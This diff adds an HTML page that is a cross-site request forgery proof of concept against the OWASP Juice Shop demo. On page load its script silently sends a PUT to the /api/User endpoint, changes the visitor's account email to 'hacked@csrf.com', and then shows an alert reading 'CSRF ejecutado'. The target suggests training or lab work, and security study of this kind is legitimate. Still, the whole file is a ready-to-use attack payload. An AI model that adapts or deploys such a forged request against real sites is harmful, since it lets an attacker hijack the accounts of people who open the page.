@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      fetch("https://demo.owasp-juice.shop/api/User", {
+        method: "PUT",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          email: "hacked@csrf.com"
+        })
+      }).then(() => alert("CSRF ejecutado"));
+    </script>
+  </body>
+</html>
